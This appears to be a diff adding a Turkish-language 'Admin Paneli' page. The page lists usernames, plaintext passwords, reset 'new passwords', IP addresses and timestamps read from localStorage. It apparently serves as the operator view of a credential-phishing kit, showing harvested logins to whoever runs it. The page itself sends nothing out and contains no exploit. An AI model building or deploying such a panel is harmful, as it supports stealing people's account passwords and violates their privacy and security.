@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Admin Paneli</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f7f7f7;
+    }
+    h1, h2 {
+      color: #333;
+    }
+    .container {
+      max-width: 900px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 40px;
+    }
+    table, th, td {
+      border: 1px solid #ccc;
+    }
+    th, td {
+      padding: 10px;
+      text-align: left;
+      word-break: break-word;
+    }
+    th {
+      background: #eee;
+    }
+    .section-title {
+      margin-top: 40px;
+      margin-bottom: 15px;
+      border-bottom: 2px solid #3897f0;
+      padding-bottom: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Admin Paneli</h1>
+
+    <h2 class="section-title">Giriş Bilgileri</h2>
+    <table id="entriesTable">
+      <thead>
+        <tr>
+          <th>Kullanıcı Adı</th>
+          <th>Şifre</th>
+          <th>IP Adresi</th>
+          <th>Zaman</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Giriş bilgileri buraya gelecek -->
+      </tbody>
+    </table>
+
+    <h2 class="section-title">Şifre Sıfırlama Bilgileri</h2>
+    <table id="forgotTable">
+      <thead>
+        <tr>
+          <th>Kullanıcı Adı</th>
+          <th>Yeni Şifre</th>
+          <th>IP Adresi</th>
+          <th>Zaman</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Şifre sıfırlama bilgileri buraya gelecek -->
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    function loadEntries() {
+      // LocalStorage'dan giriş bilgilerini al
+      const loginEntries = JSON.parse(localStorage.getItem('loginEntries')) || [];
+      const entriesTableBody = document.querySelector('#entriesTable tbody');
+      entriesTableBody.innerHTML = ''; // Temizle
+
+      loginEntries.forEach(entry => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${sanitize(entry.username)}</td>
+          <td>${sanitize(entry.password)}</td>
+          <td>${sanitize(entry.ip)}</td>
+          <td>${sanitize(entry.time)}</td>
+        `;
+        entriesTableBody.appendChild(tr);
+      });
+
+      // LocalStorage'dan şifre sıfırlama bilgilerini al
+      const forgotEntries = JSON.parse(localStorage.getItem('forgotEntries')) || [];
+      const forgotTableBody = document.querySelector('#forgotTable tbody');
+      forgotTableBody.innerHTML = ''; // Temizle
+
+      forgotEntries.forEach(entry => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${sanitize(entry.username)}</td>
+          <td>${sanitize(entry.newpassword)}</td>
+          <td>${sanitize(entry.ip)}</td>
+          <td>${sanitize(entry.time)}</td>
+        `;
+        forgotTableBody.appendChild(tr);
+      });
+    }
+
+    // Basit XSS koruması için escape fonksiyonu
+    function sanitize(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#39;");
+    }
+
+    // Sayfa yüklendiğinde verileri göster
+    window.onload = loadEntries;
+  </script>
+</body>
+</html>
